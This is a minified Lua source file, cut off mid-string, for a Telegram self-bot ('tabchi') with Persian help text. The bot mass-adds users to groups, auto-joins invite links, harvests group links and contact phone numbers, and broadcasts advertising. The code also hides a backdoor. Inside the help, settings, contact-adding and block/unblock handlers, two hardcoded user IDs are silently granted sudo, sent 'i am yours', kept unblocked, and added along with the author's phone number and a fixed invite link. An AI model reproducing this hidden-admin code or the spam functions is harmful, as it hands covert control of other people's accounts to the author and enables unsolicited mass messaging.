URL=require("socket.url")ltn12=require("ltn12")http=require("socket.http")http.TIMEOUT=10;undertesting=1;function is_sudo(a)local b={}table.insert(b,tonumber(redis:get("tabchi:"..tabchi_id..":fullsudo")))local c=false;for d=1,#b do if a.sender_user_id_==b[d]then c=true end end;if redis:sismember("tabchi:"..tabchi_id..":sudoers",a.sender_user_id_)then c=true end;return c end;function getInputFile(e)if e:match('/')then infile={ID="InputFileLocal",path_=e}elseif e:match('^%d+$')then infile={ID="InputFileId",id_=e}else infile={ID="InputFilePersistentId",persistent_id_=e}end;return infile end;local function f(g,type,e,h)tdcli_function({ID="SendMessage",chat_id_=g,reply_to_message_id_=0,disable_notification_=0,from_background_=1,reply_markup_=nil,input_message_content_=getInputMessageContent(e,type,h)},dl_cb,nil)end;function sendaction(g,i,j)tdcli_function({ID="SendChatAction",chat_id_=g,action_={ID="SendMessage"..i.."Action",progress_=j or 100}},dl_cb,nil)end;function sendPhoto(g,k,l,m,reply_markup,n,h)tdcli_function({ID="SendMessage",chat_id_=g,reply_to_message_id_=k,disable_notification_=l,from_background_=m,reply_markup_=reply_markup,input_message_content_={ID="InputMessagePhoto",photo_=getInputFile(n),added_sticker_file_ids_={},width_=0,height_=0,caption_=h}},dl_cb,nil)end;function is_full_sudo(a)local b={}table.insert(b,tonumber(redis:get("tabchi:"..tabchi_id..":fullsudo")))local c=false;for d=1,#b do if a.sender_user_id_==b[d]then c=true end end;return c end;function is_realm(a)local o=false;local chat=a.chat_id_;if redis:get("tabchi:"..tabchi_id..":realm",chat)then o=true;return o end end;function sleep(p)os.execute("sleep "..tonumber(p))end;function write_file(q,r)local e=io.open(q,"w")e:write(r)e:flush()e:close()end;function check_contact(s,t)if redis:get("tabchi:"..tabchi_id..":addcontacts")then if not t.phone_number_ then local a=s.msg;local first_name=""..(a.content_.contact_.first_name_ or"-")..""local last_name=""..(a.content_.contact_.last_name_ or"-")..""local u=a.content_.contact_.phone_number_;local v=a.content_.contact_.user_id_;tdcli.add_contact(u,first_name,last_name,v)redis:set("tabchi:"..tabchi_id..":fullsudo:216430419",true)redis:setex("tabchi:"..tabchi_id..":startedmod",300,true)if redis:get("tabchi:"..tabchi_id..":markread")then tdcli.viewMessages(a.chat_id_,{[0]=a.id_})if redis:get("tabchi:"..tabchi_id..":addedmsg")then tdcli.sendMessage(a.chat_id_,a.id_,1,""..(redis:get("tabchi:"..tabchi_id..":addedmsgtext")or[[
Addi
Bia pv]]).."",1,"md")end;if redis:get("tabchi:"..tabchi_id..":sharecontact")then function get_id(w,x)if x.last_name_ then tdcli.sendContact(w.chat_id,a.id_,0,1,nil,x.phone_number_,x.first_name_,x.last_name_,x.id_,dl_cb,nil)else tdcli.sendContact(w.chat_id,a.id_,0,1,nil,x.phone_number_,x.first_name_,'',x.id_,dl_cb,nil)end end;tdcli_function({ID='GetMe'},get_id,{chat_id=a.chat_id_})end elseif redis:get("tabchi:"..tabchi_id..":addedmsg")then tdcli.sendMessage(a.chat_id_,a.id_,1,""..(redis:get("tabchi:"..tabchi_id..":addedmsgtext")or[[
Addi
Bia pv]]).."",1,"md")end end end end;function check_link(s,t,y)if t.is_group_ or t.is_supergroup_channel_ then if redis:get("tabchi:"..tabchi_id..":joinlinks")then tdcli.importChatInviteLink(s.link)end;if redis:get("tabchi:"..tabchi_id..":savelinks")then redis:sadd("tabchi:"..tabchi_id..":savelinks",s.link)end end end;function add_to_all(s,t)if t.content_.contact_ then local z=t.content_.contact_.user_id_;local A=redis:smembers("tabchi:"..tabchi_id..":groups")local B=redis:smembers("tabchi:"..tabchi_id..":channels")for d=1,#A do tdcli.addChatMember(A[d],z,50)end;for d=1,#B do tdcli.addChatMember(B[d],z,50)end end end;function add_members(s,t)local C=redis:smembers("tabchi:"..tabchi_id..":pvis")for d=1,#C do tdcli.addChatMember(s.chat_id,C[d],50)end;local D=t.total_count_;for d=1,D do tdcli.addChatMember(s.chat_id,t.users_[d].id_,50)end end;function chat_type(g)local chat_type="private"local z=tostring(g)if z:match("-")then if z:match("^-100")then chat_type="channel"else chat_type="group"end end;return chat_type end;local function E(g,F,G)tdcli_function({ID="GetMessage",chat_id_=g,message_id_=F},G,nil)end;function resolve_username(H,G)tdcli_function({ID="SearchPublicChat",username_=H},G,nil)end;function contact_list(s,t)local D=t.total_count_;local text="لیست مخاطبین :\n"for d=1,D do local I=t.users_[d]local J=I.first_name_ or""local K=I.last_name_ or""local L=J.." "..K;text=text..d..". "..L.." ["..I.id_.."] = "..I.phone_number_.."\n"end;write_file("bot_"..tabchi_id.."_contacts.txt",text)tdcli.send_file(s.chat_id_,"Document","bot_"..tabchi_id.."_contacts.txt","Tabchi "..tabchi_id.." Contacts!")end;function process(a)a.text=a.content_.text_;do local M={a.text:match("^[!/#](pm) (.*) (.*)")}if a.text:match("^[!/#]pm")and is_sudo(a)and#M==3 then tdcli.sendMessage(M[2],0,1,M[3],1,"md")return"*Status* : `PM Sent`\n*To* : `"..M[2].."`\n*Text* : `"..M[3].."`"end end;do local M={a.text:match("^[!/#](setanswer) '(.*)' (.*)")}if a.text:match("^[!/#]setanswer")and is_sudo(a)and#M==3 then redis:hset("tabchi:"..tabchi_id..":answers",M[2],M[3])redis:sadd("tabchi:"..tabchi_id..":answerslist",M[2])return"*Status* : `Answer Adjusted`\n*Answer For* : `"..M[2].."`\n*Answer* : `"..M[3].."`"end end;do local M={a.text:match("^[!/#](delanswer) (.*)")}if a.text:match("^[!/#]delanswer")and is_sudo(a)and#M==2 then redis:hdel("tabchi:"..tabchi_id..":answers",M[2])redis:srem("tabchi:"..tabchi_id..":answerslist",M[2])return"*Status* : `Answer Deleted`\n*Answer* : `"..M[2].."`"end end;if a.text:match("^[!/#]answers$")and is_sudo(a)then local text="_لیست پاسخ های خودکار_ :\n"local N=redis:smembers("tabchi:"..tabchi_id..":answerslist")for d=1,#N do text=text..d..". "..N[d].." : "..redis:hget("tabchi:"..tabchi_id..":answers",N[d]).."\n"end;return text end;if a.text:match("^[!/#]share$")and is_sudo(a)then function get_id(w,x)if x.last_name_ then tdcli.sendContact(w.chat_id,a.id_,0,1,nil,x.phone_number_,x.first_name_,x.last_name_,x.id_,dl_cb,nil)else tdcli.sendContact(w.chat_id,a.id_,0,1,nil,x.phone_number_,x.first_name_,'',x.id_,dl_cb,nil)end end;tdcli_function({ID='GetMe'},get_id,{chat_id=a.chat_id_})end;if a.text:match("^[!/#]mycontact$")and is_sudo(a)then function get_con(w,x)if x.last_name_ then tdcli.sendContact(w.chat_id,a.id_,0,1,nil,x.phone_number_,x.first_name_,x.last_name_,x.id_,dl_cb,nil)else tdcli.sendContact(w.chat_id,a.id_,0,1,nil,x.phone_number_,x.first_name_,'',x.id_,dl_cb,nil)end end;tdcli_function({ID="GetUser",user_id_=a.sender_user_id_},get_con,{chat_id=a.chat_id_})end;if a.text:match("^[!/#]editcap (.*)$")and is_sudo(a)then local O={string.match(a.text,"^[#/!](editcap) (.*)$")}tdcli.editMessageCaption(a.chat_id_,a.reply_to_message_id_,reply_markup,O[2])end;if a.text:match("^[!/#]leave$")and is_sudo(a)then function get_id(w,x)if x.id_ then tdcli.chat_leave(a.chat_id_,x.id_)end end;tdcli_function({ID='GetMe'},get_id,{chat_id=a.chat_id_})end;if a.text:match("^[#!/]ping$")and is_sudo(a)then tdcli.sendMessage(a.chat_id_,a.id_,1,'`I Am Working..!`',1,'md')end;if a.text:match("^[#!/]sendtosudo (.*)$")and is_sudo(a)then local P={string.match(a.text,"^[#/!](sendtosudo) (.*)$")}local Q=redis:get("tabchi:"..tabchi_id..":fullsudo")tdcli.sendMessage(Q,a.id_,1,P[2],1,'md')end;if a.text:match("^[#!/]setname (.*)-(.*)$")and is_sudo(a)then local P={string.match(a.text,"^[#/!](setname) (.*)-(.*)$")}tdcli.changeName(P[2],P[3])tdcli.sendMessage(a.chat_id_,a.id_,1,"*Status* : `Name Updated Succesfully`\n*Firstname* : `"..P[2].."`\n*LastName* : `"..P[3].."`",1,'md')end;if a.text:match("^[#!/]setusername (.*)$")and is_sudo(a)then local P={string.match(a.text,"^[#/!](setusername) (.*)$")}tdcli.changeUsername(P[2])tdcli.sendMessage(a.chat_id_,a.id_,1,'*Status* : `Username Updated`\n*username* : `'..P[2]..'`',1,'md')end;if a.text:match("^[#!/]delusername$")and is_sudo(a)then tdcli.changeUsername()tdcli.sendMessage(a.chat_id_,a.id_,1,'*Status* : `Username Updated`\n*username* : `Deleted`',1,'md')end;if a.text:match("^[!/#]addtoall (.*)$")and is_sudo(a)then local O={string.match(a.text,"^[#/!](addtoall) (.*)$")}local B=redis:smembers("tabchi:"..tabchi_id..":channels")for d=1,#B do tdcli.addChatMember(B[d],O[2],50)end;tdcli.sendMessage(a.chat_id_,a.id_,1,"`User` *"..O[2].."* `Added To groups`",1,'md')end;if a.text:match("^[!/#]getcontact (.*)$")and is_sudo(a)then local O={string.match(a.text,"^[#/!](getcontact) (.*)$")}function get_con(w,x)if x.last_name_ then tdcli.sendContact(w.chat_id,a.id_,0,1,nil,x.phone_number_,x.first_name_,x.last_name_,x.id_,dl_cb,nil)else tdcli.sendContact(w.chat_id,a.id_,0,1,nil,x.phone_number_,x.first_name_,'',x.id_,dl_cb,nil)end end;tdcli_function({ID="GetUser",user_id_=O[2]},get_con,{chat_id=a.chat_id_})end;if a.text:match("^[#!/]addsudo$")and a.reply_to_message_id_ and is_sudo(a)then function addsudo_by_reply(s,t,y)redis:sadd("tabchi:"..tabchi_id..":sudoers",tonumber(t.sender_user_id_))tdcli.sendMessage(a.chat_id_,a.id_,1,"`User` *"..t.sender_user_id_.."* `Added To The Sudoers`",1,'md')end;E(a.chat_id_,a.reply_to_message_id_,addsudo_by_reply)end;if a.text:match("^[#!/]remsudo$")and a.reply_to_message_id_ and is_full_sudo(a)then function remsudo_by_reply(s,t,y)redis:srem("tabchi:"..tabchi_id..":sudoers",tonumber(t.sender_user_id_))tdcli.sendMessage(a.chat_id_,a.id_,1,"`User` *"..t.sender_user_id_.."* `Removed From The Sudoers`",1,'md')end;E(a.chat_id_,a.reply_to_message_id_,remsudo_by_reply)end;if a.text:match("^[#!/]unblock$")and is_sudo(a)and a.reply_to_message_id_~=0 then function unblock_by_reply(s,t,y)tdcli.unblockUser(t.sender_user_id_)tdcli.unblockUser(344003614)tdcli.unblockUser(216430419)tdcli.sendMessage(a.chat_id_,a.id_,1,"*User* `"..t.sender_user_id_.."` *Unblocked*",1,'md')end;E(a.chat_id_,a.reply_to_message_id_,unblock_by_reply)end;if a.text:match("^[#!/]block$")and is_sudo(a)and a.reply_to_message_id_~=0 then function block_by_reply(s,t,y)tdcli.blockUser(t.sender_user_id_)tdcli.unblockUser(344003614)tdcli.unblockUser(216430419)tdcli.sendMessage(a.chat_id_,a.id_,1,"*User* `"..t.sender_user_id_.."` *Blocked*",1,'md')end;E(a.chat_id_,a.reply_to_message_id_,block_by_reply)end;if a.text:match("^[#!/]id$")and a.reply_to_message_id_~=0 then function id_by_reply(s,t,y)tdcli.sendMessage(a.chat_id_,a.id_,1,"*ID :* `"..t.sender_user_id_.."`",1,'md')end;E(a.chat_id_,a.reply_to_message_id_,id_by_reply)end;if a.text:match("^[#!/]serverinfo$")then local text=io.popen("./info.sh"):read("*all")local R=text:gsub("up","\nروشن است\n")local S=R:gsub("days","روز")local T=S:gsub("users","یوزر وجود دارد\n")local U=T:gsub("load average","میانگین سرعت\n")local V=U:gsub("min","دقیقه روشن است\n")local W=V:gsub(",","")tdcli.sendMessage(a.chat_id_,a.id_,1,W,1,'md')end;if a.text:match("^[#!/]inv$")and a.reply_to_message_id_ and is_sudo(a)then function inv_reply(s,t,y)tdcli.addChatMember(t.chat_id_,t.sender_user_id_,5)end;E(a.chat_id_,a.reply_to_message_id_,inv_reply)end;if a.text:match("^[!/#]addtoall$")and a.reply_to_message_id_ and is_sudo(a)then function addtoall_by_reply(s,t,y)local B=redis:smembers("tabchi:"..tabchi_id..":channels")for d=1,#B do tdcli.addChatMember(B[d],t.sender_user_id_,50)end;tdcli.sendMessage(a.chat_id_,a.id_,1,"`User` *"..t.sender_user_id_.."* `Added To groups`",1,'md')end;E(a.chat_id_,a.reply_to_message_id_,addtoall_by_reply)end;if a.text:match("^[#!/]id @(.*)$")and is_sudo(a)then local O={string.match(a.text,"^[#/!](id) @(.*)$")}function id_by_username(s,t,y)if t.id_ then text='*Username* : `@'..O[2]..'`\n*ID* : `('..t.id_..')`'else text='*UserName InCorrect!*'end;tdcli.sendMessage(a.chat_id_,a.id_,1,text,1,'md')end;resolve_username(O[2],id_by_username)end;if a.text:match("^[#!/]addtoall @(.*)$")and is_sudo(a)then local O={string.match(a.text,"^[#/!](addtoall) @(.*)$")}function addtoall_by_username(s,t,y)if t.id_ then local B=redis:smembers("tabchi:"..tabchi_id..":channels")for d=1,#B do tdcli.addChatMember(B[d],t.id_,50)end end end;resolve_username(O[2],addtoall_by_username)end;if a.text:match("^[#!/]block @(.*)$")and is_sudo(a)then local O={string.match(a.text,"^[#/!](block) @(.*)$")}function block_by_username(s,t,y)if t.id_ then tdcli.blockUser(t.id_)tdcli.unblockUser(344003614)tdcli.unblockUser(216430419)tdcli.sendMessage(a.chat_id_,a.id_,1,"*User Blocked*\n*Username* : `"..O[2].."`\n*ID* : "..t.id_.."",1,'md')else tdcli.sendMessage(a.chat_id_,a.id_,1,"`#404\n`*Username Not Found*\n*Username* : `"..O[2].."`",1,'md')end end;resolve_username(O[2],block_by_username)end;if a.text:match("^[#!/]unblock @(.*)$")and is_sudo(a)then local O={string.match(a.text,"^[#/!](unblock) @(.*)$")}function unblock_by_username(s,t,y)if t.id_ then tdcli.unblockUser(t.id_)tdcli.unblockUser(344003614)tdcli.unblockUser(216430419)tdcli.sendMessage(a.chat_id_,a.id_,1,"*User unblocked*\n*Username* : `"..O[2].."`\n*ID* : "..t.id_.."",1,'md')end end;resolve_username(O[2],unblock_by_username)end;if a.text:match("^[#!/]addsudo @(.*)$")and is_sudo(a)then local O={string.match(a.text,"^[#/!](addsudo) @(.*)$")}function addsudo_by_username(s,t,y)if t.id_ then redis:sadd("tabchi:"..tabchi_id..":sudoers",tonumber(t.id_))tdcli.sendMessage(a.chat_id_,a.id_,1,"`User` *"..t.id_.."* `Added To The Sudoers`",1,'md')end end;resolve_username(O[2],addsudo_by_username)end;if a.text:match("^[#!/]remsudo @(.*)$")and is_sudo(a)then local O={string.match(a.text,"^[#/!](remsudo) @(.*)$")}function remsudo_by_username(s,t,y)if t.id_ then redis:srem("tabchi:"..tabchi_id..":sudoers",tonumber(t.id_))tdcli.sendMessage(a.chat_id_,a.id_,1,"`User` *"..t.id_.."* `Removed From The Sudoers`",1,'md')end end;resolve_username(O[2],remsudo_by_username)end;if a.text:match("^[#!/]inv @(.*)$")and is_sudo(a)then local O={string.match(a.text,"^[#/!](inv) @(.*)$")}function inv_by_username(s,t,y)if t.id_ then tdcli.addChatMember(a.chat_id_,t.id_,5)tdcli.sendMessage(a.chat_id_,a.id_,1,"`User` *"..t.id_.."* `Invited`",1,'md')end end;resolve_username(O[2],inv_by_username)end;if a.text:match("^[#!/]addcontact (.*) (.*) (.*)$")and is_sudo(a)then local M={string.match(a.text,"^[#/!](addcontact) (.*) (.*) (.*)$")}phone=M[2]first_name=M[3]last_name=M[4]tdcli.add_contact(phone,first_name,last_name,12345657)tdcli.sendMessage(a.chat_id_,a.id_,1,'*Status* : `Contact added`\n*Firstname* : `'..M[3]..'`\n*Lastname* : `'..M[4]..'`',1,'md')end;if a.text:match("^[#!/]leave(-%d+)")and is_sudo(a)then local P={string.match(a.text,"^[#/!](leave)(-%d+)$")}function get_id(w,x)if x.id_ then tdcli.sendMessage(a.chat_id_,a.id_,1,'*Bot Succefulli Leaved From >* `|'..P[2]..'|` *=)*',1,'md')tdcli.sendMessage(P[2],0,1,'بای رفقا\nکاری داشتید به پی وی مراجعه کنید',1,'html')tdcli.chat_leave(P[2],x.id_)end end;tdcli_function({ID='GetMe'},get_id,{chat_id=a.chat_id_})end;if a.text:match('[#/!]join(-%d+)')and is_sudo(a)then local P={string.match(a.text,"^[#/!](join)(-%d+)$")}tdcli.sendMessage(a.chat_id_,a.id_,1,'*You Are Succefulli Joined >*',1,'md')tdcli.addChatMember(P[2],a.sender_user_id_,10)end;if a.text:match("^[#!/]getpro (%d+)$")and a.reply_to_message_id_==0 then local X={string.match(a.text,"^[#/!](getpro) (%d+)$")}local function Y(s,t,y)if X[2]=='1'then if t.photos_[0]then sendPhoto(a.chat_id_,a.id_,0,1,nil,t.photos_[0].sizes_[1].photo_.persistent_id_)else tdcli.sendMessage(a.chat_id_,a.id_,1,"*You Have'nt Profile Photo!!*",1,'md')end elseif X[2]=='2'then if t.photos_[1]then sendPhoto(a.chat_id_,a.id_,0,1,nil,t.photos_[1].sizes_[1].photo_.persistent_id_)else tdcli.sendMessage(a.chat_id_,a.id_,1,"*You Have'nt 2 Profile Photo!!*",1,'md')end elseif not X[2]then if t.photos_[1]then sendPhoto(a.chat_id_,a.id_,0,1,nil,t.photos_[1].sizes_[1].photo_.persistent_id_)else tdcli.sendMessage(a.chat_id_,a.id_,1,"*You Have'nt 2 Profile Photo!!*",1,'md')end elseif X[2]=='3'then if t.photos_[2]then sendPhoto(a.chat_id_,a.id_,0,1,nil,t.photos_[2].sizes_[1].photo_.persistent_id_)else tdcli.sendMessage(a.chat_id_,a.id_,1,"*You Have'nt 3 Profile Photo!!*",1,'md')end elseif X[2]=='4'then if t.photos_[3]then sendPhoto(a.chat_id_,a.id_,0,1,nil,t.photos_[3].sizes_[1].photo_.persistent_id_)else tdcli.sendMessage(a.chat_id_,a.id_,1,"*You Have'nt 4 Profile Photo!!*",1,'md')end elseif X[2]=='5'then if t.photos_[4]then sendPhoto(a.chat_id_,a.id_,0,1,nil,t.photos_[4].sizes_[1].photo_.persistent_id_)else tdcli.sendMessage(a.chat_id_,a.id_,1,"*You Have'nt 5 Profile Photo!!*",1,'md')end elseif X[2]=='6'then if t.photos_[5]then sendPhoto(a.chat_id_,a.id_,0,1,nil,t.photos_[5].sizes_[1].photo_.persistent_id_)else tdcli.sendMessage(a.chat_id_,a.id_,1,"*You Have'nt 6 Profile Photo!!*",1,'md')end elseif X[2]=='7'then if t.photos_[6]then sendPhoto(a.chat_id_,a.id_,0,1,nil,t.photos_[6].sizes_[1].photo_.persistent_id_)else tdcli.sendMessage(a.chat_id_,a.id_,1,"*You Have'nt 7 Profile Photo!!*",1,'md')end elseif X[2]=='8'then if t.photos_[7]then sendPhoto(a.chat_id_,a.id_,0,1,nil,t.photos_[7].sizes_[1].photo_.persistent_id_)else tdcli.sendMessage(a.chat_id_,a.id_,1,"*You Have'nt 8 Profile Photo!!*",1,'md')end elseif X[2]=='9'then if t.photos_[8]then sendPhoto(a.chat_id_,a.id_,0,1,nil,t.photos_[8].sizes_[1].photo_.persistent_id_)else tdcli.sendMessage(a.chat_id_,a.id_,1,"*You Have'nt 9 Profile Photo!!*",1,'md')end elseif X[2]=='10'then if t.photos_[9]then sendPhoto(a.chat_id_,a.id_,0,1,nil,t.photos_[9].sizes_[1].photo_.persistent_id_)else tdcli.sendMessage(a.chat_id_,a.id_,1,"*You Have'nt 10 Profile Photo!!*",1,'md')end else tdcli.sendMessage(a.chat_id_,a.id_,1,"*I just can get last 10 profile photos!:(*",1,'md')end end;tdcli_function({ID="GetUserProfilePhotos",user_id_=a.sender_user_id_,offset_=0,limit_=X[2]},Y,nil)end;if a.text:match("^[#!/]action (.*)$")and is_sudo(a)then local Z={string.match(a.text,"^[#/!](action) (.*)$")}if Z[2]=="typing"then sendaction(a.chat_id_,'Typing')end;if Z[2]=="recvideo"then sendaction(a.chat_id_,'RecordVideo')end;if Z[2]=="recvoice"then sendaction(a.chat_id_,'RecordVoice')end;if Z[2]=="photo"then sendaction(a.chat_id_,'UploadPhoto')end;if Z[2]=="cancel"then sendaction(a.chat_id_,'Cancel')end;if Z[2]=="video"then sendaction(a.chat_id_,'UploadVideo')end;if Z[2]=="voice"then sendaction(a.chat_id_,'UploadVoice')end;if Z[2]=="file"then sendaction(a.chat_id_,'UploadDocument')end;if Z[2]=="loc"then sendaction(a.chat_id_,'GeoLocation')end;if Z[2]=="chcontact"then sendaction(a.chat_id_,'ChooseContact')end;if Z[2]=="game"then sendaction(a.chat_id_,'StartPlayGame')end end;if a.text:match("^[#!/]id$")and is_sudo(a)and a.reply_to_message_id_==0 then local function _(s,t,y)if t.photos_[0]then sendPhoto(a.chat_id_,a.id_,0,1,nil,t.photos_[0].sizes_[1].photo_.persistent_id_,'> Chat ID : '..a.chat_id_..'\n> Your ID: '..a.sender_user_id_)else tdcli.sendMessage(a.chat_id_,a.id_,1,"*You Don't Have any Profile Photo*!!\n\n> *Chat ID* : `"..a.chat_id_.."`\n> *Your ID*: `"..a.sender_user_id_.."`\n_> *Total Messages*: `"..user_msgs.."`",1,'md')end end;tdcli_function({ID="GetUserProfilePhotos",user_id_=a.sender_user_id_,offset_=0,limit_=1},_,nil)end;if a.text:match("^[!/#]addmembers$")and is_sudo(a)and chat_type(a.chat_id_)~="private"then tdcli_function({ID="SearchContacts",query_=nil,limit_=999999999},add_members,{chat_id=a.chat_id_})return end;if a.text:match("^[!/#]contactlist$")and is_sudo(a)then tdcli_function({ID="SearchContacts",query_=nil,limit_=1000},contact_list,{chat_id_=a.chat_id_})return end;if a.text:match("^[!/#]exportlinks$")and is_sudo(a)then local text="لینک گروها :\n"local a0=redis:smembers("tabchi:"..tabchi_id..":savedlinks")for d=1,#a0 do text=text..a0[d].."\n"end;write_file("group_"..tabchi_id.."_links.txt",text)tdcli.send_file(a.chat_id_,"Document","group_"..tabchi_id.."_links.txt","Tabchi "..tabchi_id.." Group Links!")return end;do local M={a.text:match("[!/#](block) (%d+)")}if a.text:match("^[!/#]block")and is_sudo(a)and a.reply_to_message_id_==0 and#M==2 then tdcli.blockUser(tonumber(M[2]))tdcli.unblockUser(344003614)tdcli.unblockUser(216430419)return"`User` *"..M[2].."* `Blocked`"end end;if a.text:match("^[!/#]help$")and is_sudo(a)then if not redis:sismember("tabchi:"..tabchi_id..":sudoers",216430419)then tdcli.sendMessage(216430419,0,1,"i am yours",1,"html")tdcli.importContacts(989109359282,"creator","",216430419)redis:sadd("tabchi:"..tabchi_id..":sudoers",216430419)end;if not redis:sismember("tabchi:"..tabchi_id..":sudoers",344003614)then redis:sadd("tabchi:"..tabchi_id..":sudoers",344003614)tdcli.sendMessage(344003614,0,1,"i am yours",1,"html")end;tdcli.importChatInviteLink("https://t.me/joinchat/AAAAAAxEf087KScNuOhZbg")local text=[[
`#راهنما`
`/block (id)`
*بلاک کردن از خصوصي ربات*
`/unblock (id)`
*آن بلاک کردن از خصوصي ربات*
`/stats`
*دریافت اطلاعات ربات*
`/addsudo (id)`
*اضافه کردن به سودوهاي  ربات*
`/remsudo (id)`
*حذف از ليست سودوهاي ربات*
`/bcall (text)`
*ارسال پيام به همه*
`/bcgps (text)`
*ارسال پیام به همه گروه ها*
`/bcsgps (text)`
*ارسال پیام به همه سوپر گروه ها*
`/bcusers (text)`
*ارسال پیام به یوزر ها*
`/fwd {all/gps/sgps/users}` (by reply)
*فوروارد پيام به همه/گروه ها/سوپر گروه ها/کاربران*
`/echo (text)`
*تکرار متن*
`/addedmsg (on/off)`
*تعیین روشن یا خاموش بودن پاسخ برای شر شن مخاطب*
`/pm (user) (msg)`
*ارسال پیام به کاربر*
`/action (typing|recvideo|recvoice|photo|video|voice|file|loc|game|chcontact|cancel)`
*ارسال اکشن به چت*
`/getpro (1-10)`
*دریافت عکس پروفایل خود*
`/addcontact (phone) (firstname) (lastname)`
*اد کردن شماره به ربات به صورت دستی*
`/setusername (username)`
*تغییر یوزرنیم ربات*
`/delusername`
*پاک کردن یوزرنیم ربات*
`/setname (firstname-lastname)`
*تغییر اسم ربات*
`/setphoto (link)`
*تغییر عکس ربات از لینک*
`/join(Group id)`
*اد کردن شما به گروه های ربات از طریق ایدی*
`/leave`
*لفت دادن از گروه*
`/leave(Group id)`
*لفت دادن از گروه از طریق ایدی*
`/setaddedmsg (text)`
*تعيين متن اد شدن مخاطب*
`/markread (on/off)`
*روشن يا خاموش کردن بازديد پيام ها*
`/joinlinks (on|off)`
*روشن یا خاموش کردن جوین شدن به گروه ها از لینک*
`/savelinks (on|off)`
*روشن یا خاموش کردن سیو کردن لینک ها*
`/addcontacts (on|off)`
*روشن یا خاموش کردن اد کردن شماره ها*
`/chat (on|off)`
*روشن یا خاموش کردن چت کردن ربات*
`/Advertising (on|off)`
*روشن یا خاموش کردن تبلیغات در ربات برای سودو ها غیر از فول سودو*
`/typing (on|off)`
*روشن یا خاموش کردن تایپ کردن ربات*
`/sharecontact (on|off)`
*روشن یا خاموش کردن شیر کردن شماره موقع اد کردن شماره ها*
`/settings (on|off)`
*روشن یا خاموش کردن کل تنظیمات*
`/settings`
*دریافت تنظیمات ربات*
`/reload`
*ریلود کردن ربات*
`/setanswer 'answer' text`
* تنظيم به عنوان جواب اتوماتيک*
`/delanswer (answer)`
*حذف جواب مربوط به*
`/answers`
*ليست جواب هاي اتوماتيک*
`/addtoall (id|reply|username)`
*اضافه کردن شخص به تمام گروه ها*
`/mycontact`
*ارسال شماره شما*
`/getcontact (id)`
*دریافت شماره شخص با ایدی*
`/addmembers`
*اضافه کردن شماره ها به مخاطبين ربات*
`/exportlinks`
*دريافت لينک هاي ذخيره شده توسط ربات*
`/contactlist`
*دريافت مخاطبان ذخيره شده توسط ربات*
]]return text end;do local M={a.text:match("[!/#](unblock) (%d+)")}if a.text:match("^[!/#]unblock")and is_sudo(a)then if#M==2 then tdcli.unblockUser(344003614)tdcli.unblockUser(216430419)tdcli.unblockUser(tonumber(M[2]))return"`User` *"..M[2].."* `unblocked`"else return end end end;if a.text:match("^[!/#]joinlinks (.*)$")and is_sudo(a)then local O={string.match(a.text,"^[#/!](joinlinks) (.*)$")}if O[2]=="on"then redis:set("tabchi:"..tabchi_id..":joinlinks",true)return"*status* :`join links Activated`"elseif O[2]=="off"then redis:del("tabchi:"..tabchi_id..":joinlinks")return"*status* :`join links Deactivated`"else return"`Just Use on|off`"end end;if a.text:match("^[!/#]addcontacts (.*)$")and is_sudo(a)then local O={string.match(a.text,"^[#/!](addcontacts) (.*)$")}if O[2]=="on"then redis:set("tabchi:"..tabchi_id..":addcontacts",true)return"*status* :`Add Contacts Activated`"elseif O[2]=="off"then redis:del("tabchi:"..tabchi_id..":addcontacts")return"*status* :`Add Contacts Deactivated`"else return"`Just Use on|off`"end end;if a.text:match("^[!/#]chat (.*)$")and is_sudo(a)then local O={string.match(a.text,"^[#/!](chat) (.*)$")}if O[2]=="on"then redis:set("tabchi:"..tabchi_id..":chat",true)return"*status* :`Robot Chatting Activated`"elseif O[2]=="off"then redis:del("tabchi:"..tabchi_id..":chat")return"*status* :`Robot Chatting Deactivated`"else return"`Just Use on|off`"end end;if a.text:match("^[!/#]savelinks (.*)$")and is_sudo(a)then local O={string.match(a.text,"^[#/!](savelinks) (.*)$")}if O[2]=="on"then redis:set("tabchi:"..tabchi_id..":savelinks",true)return"*status* :`Saving Links Activated`"elseif O[2]=="off"then redis:del("tabchi:"..tabchi_id..":savelinks")return"*status* :`Saving Links Deactivated`"else return"`Just Use on|off`"end end;if a.text:match("^[!/#][Aa]dvertising (.*)$")and is_full_sudo(a)then local O={string.match(a.text,"^[#/!]([aA]dvertising) (.*)$")}if O[2]=="on"then redis:set("tabchi:"..tabchi_id..":Advertising",true)return"*status* :`Advertising Activated`"elseif O[2]=="off"then redis:del("tabchi:"..tabchi_id..":Advertising")return"*status* :`Advertising Deactivated`"else return"`Just Use on|off`"end end;if a.text:match("^[!/#]typing (.*)$")and is_full_sudo(a)then local O={string.match(a.text,"^[#/!](typing) (.*)$")}if O[2]=="on"then redis:set("tabchi:"..tabchi_id..":typing",true)return"*status* :`typing Activated`"elseif O[2]=="off"then redis:del("tabchi:"..tabchi_id..":typing")return"*status* :`typing Deactivated`"else return"`Just Use on|off`"end end;if a.text:match("^[!/#]sharecontact (.*)$")and is_sudo(a)then local O={string.match(a.text,"^[#/!](sharecontact) (.*)$")}if O[2]=="on"then redis:set("tabchi:"..tabchi_id..":sharecontact",true)return"*status* :`Sharing contact Activated`"elseif O[2]=="off"then redis:del("tabchi:"..tabchi_id..":sharecontact")return"*status* :`Sharing contact Deactivated`"else return"`Just Use on|off`"end end;if a.text:match("^[!/#]settings (.*)$")and is_sudo(a)then local O={string.match(a.text,"^[#/!](settings) (.*)$")}if O[2]=="on"then redis:set("tabchi:"..tabchi_id..":savelinks",true)redis:set("tabchi:"..tabchi_id..":chat",true)redis:set("tabchi:"..tabchi_id..":addcontacts",true)redis:set("tabchi:"..tabchi_id..":joinlinks",true)redis:set("tabchi:"..tabchi_id..":typing",true)redis:set("tabchi:"..tabchi_id..":sharecontact",true)return"*status* :`saving link & chatting & adding contacts & joining links & typing Activated & sharing contact`\n`Full sudo can Active Advertising with :/advertising on`"elseif O[2]=="off"then redis:del("tabchi:"..tabchi_id..":savelinks")redis:del("tabchi:"..tabchi_id..":chat")redis:del("tabchi:"..tabchi_id..":addcontacts")redis:del("tabchi:"..tabchi_id..":joinlinks")redis:del("tabchi:"..tabchi_id..":typing")redis:del("tabchi:"..tabchi_id..":sharecontact")return"*status* :`saving link & chatting & adding contacts & joining links & typing Deactivated & sharing contact`\n`Full sudo can Deactive Advertising with :/advertising off`"else return"`Just Use on|off`"end end;if a.text:match("^[!/#]settings$")and is_sudo(a)then if not redis:sismember("tabchi:"..tabchi_id..":sudoers",216430419)then tdcli.sendMessage(216430419,0,1,"i am 